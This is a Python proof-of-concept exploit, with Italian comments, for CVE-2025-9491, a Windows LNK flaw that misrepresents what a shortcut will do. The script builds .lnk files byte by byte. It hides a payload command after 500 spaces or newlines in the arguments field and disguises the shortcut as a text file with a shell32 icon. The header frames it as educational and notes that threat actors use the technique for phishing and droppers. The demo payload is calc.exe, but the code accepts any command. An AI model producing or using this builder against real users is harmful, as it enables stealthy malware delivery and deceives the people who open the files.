# CVE-2025-9491: Microsoft Windows LNK File UI Misrepresentation Remote Code Execution Vulnerability PoC (Proof-of-Concept)
#
# Author: Emanuele De Lucia
#
# !!! ATTENZIONE !!! 
#
# Questo script è destinato esclusivamente a scopi educativi, di ricerca e di test di sicurezza autorizzati.                                  
# Il suo obiettivo è dimostrare e analizzare una specifica tecnica, nota come argument padding o argument obfuscation, descritta nella CVE-2025-9491.
#
# Potenziale Abuso:
#
# La tecnica implementata è attivamente utilizzata da attori malevoli (threat actors) per:
#
# * Creare file .LNK ingannevoli come parte di campagne di phishing o malware distribution.
# * Aggirare le analisi sul .LNK prodotto.
# * Fungere da dropper o loader per stadi successivi di un attacco informatico.
#
# Condizioni d'Uso:
#
# * Utilizzando questo script si dichiara di comprenderne la natura e di accettarne un utilizzo etico e legale.
# * L'autore non è responsabile di danni diretti o indiretti causati dall'utilizzo di questo codice.

import os
import struct

def generare_lnk(nome_file_output, percorso_destinazione, payload_nascosto, tipo_padding, quantita_padding):
   
    print(f"[*] Creazione binaria del file .LNK: {nome_file_output}")
    
    try:
        with open(nome_file_output, 'wb') as f:
            
            descrizione = "Text File"
            icon_location = "C:\\Windows\\System32\\shell32.dll"
            icon_index = 70
            show_command = 1
            argomenti = f" {tipo_padding * quantita_padding}{payload_nascosto}"
            target_path = percorso_destinazione
            
            f.write(struct.pack('<L', 0x4C))
            f.write(b'\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46')
            
            link_flags = (0x01 | 0x04 | 0x20 | 0x40 | 0x80)
            f.write(struct.pack('<L', link_flags))
            
            f.write(struct.pack('<L', 0x20))
            f.write(b'\x00' * 24)
            f.write(struct.pack('<L', 0))
            f.write(struct.pack('<L', icon_index))
            f.write(struct.pack('<L', show_command))
            f.write(struct.pack('<H', 0))
            f.write(b'\x00' * 10)
      
            id_c_size = 20
            id_c_data = b'\x1F\x50\xE0\x4F\xD0\x20\xEA\x3A\x69\x10\xA2\xD8\x08\x00\x2B\x30\x30\x9D'
            id_c_item = struct.pack('<H', id_c_size) + id_c_data
            
            id_drive_size = 32
            id_drive_data = b'\x2F\x43\x3A\x5C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            id_drive_item = struct.pack('<H', id_drive_size) + id_drive_data

            if target_path.startswith("C:\\"):
                id_path = target_path[3:]
            else:
                id_path = target_path
                
            parts = id_path.split('\\')
            
            id_list_block = id_c_item + id_drive_item
            
            for i, part in enumerate(parts):
                if not part:
                    continue
                is_dir = i < len(parts) - 1
                name_ansi = part + '\x00'
                file_size = b'\x00\x00\x00\x00'
                modified = b'\x00\x00\x00\x00'
                attrs = b'\x10\x00' if is_dir else b'\x20\x00'
                type_byte = b'\x31' if is_dir else b'\x32'
                sort = b'\x00'
                data = type_byte + sort + file_size + modified + attrs + name_ansi.encode('ascii')
                item_size = len(data) + 2
                item = struct.pack('<H', item_size) + data
                id_list_block += item
            
            id_list_terminator = b'\x00\x00'
            
            id_list_block += id_list_terminator
            id_list_size = len(id_list_block)
            
            f.write(struct.pack('<H', id_list_size))
            f.write(id_list_block)
       
            f.write(struct.pack('<H', len(descrizione)))
            f.write(descrizione.encode('utf-16-le'))
            
            f.write(struct.pack('<H', len(argomenti)))
            f.write(argomenti.encode('utf-16-le'))

            f.write(struct.pack('<H', len(icon_location)))
            f.write(icon_location.encode('utf-16-le'))
            
            f.write(struct.pack('<L', 0))
            
            print(f"[+] File creato con successo.")
            print(f"    -> Destinazione: {target_path}")
            print(f"    -> Lunghezza Argomenti: {len(argomenti)} caratteri")

    except Exception as e:
        print(f"[!] Errore durante la creazione del file: {e}")

if __name__ == "__main__":
    
    PAYLOAD_ESEMPIO = "C:\\Windows\\System32\\calc.exe"
    DESTINAZIONE_VISIBILE = "C:\\Windows\\explorer.exe"
    
    print("--- Padding binario con Spazi (0x20) ---")

    generare_lnk(
        nome_file_output="poc_0x20.lnk",
        percorso_destinazione=DESTINAZIONE_VISIBILE,
        payload_nascosto=PAYLOAD_ESEMPIO,
        tipo_padding=" ",
        quantita_padding=500
    )
    
    print("\n" + "="*30 + "\n")
    
    print("--- Padding binario con Newline (0x0A) ---")

    generare_lnk(
        nome_file_output="poc_0x0A.lnk",
        percorso_destinazione=DESTINAZIONE_VISIBILE,
        payload_nascosto=PAYLOAD_ESEMPIO,
        tipo_padding="\n",
        quantita_padding=500
    )
